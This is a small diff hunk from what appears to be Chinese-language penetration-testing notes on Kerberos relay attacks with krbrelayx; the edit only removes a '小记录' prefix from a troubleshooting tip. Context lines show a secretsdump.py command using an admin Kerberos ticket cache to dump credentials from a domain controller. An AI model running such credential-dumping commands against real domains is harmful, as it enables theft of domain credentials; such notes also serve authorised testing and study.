@@ -40,4 +40,4 @@ export KRB5CCNAME=./admin.ccache
 secretsdump.py -k -no-pass dc01.domain.local
 ```
 
-小记录：krbrelayx 相关操作依赖域内细节，失败时优先检查 DNS 解析、时间同步、SPN 和目标服务签名要求。
+krbrelayx 相关操作依赖域内细节，失败时优先检查 DNS 解析、时间同步、SPN 和目标服务签名要求。
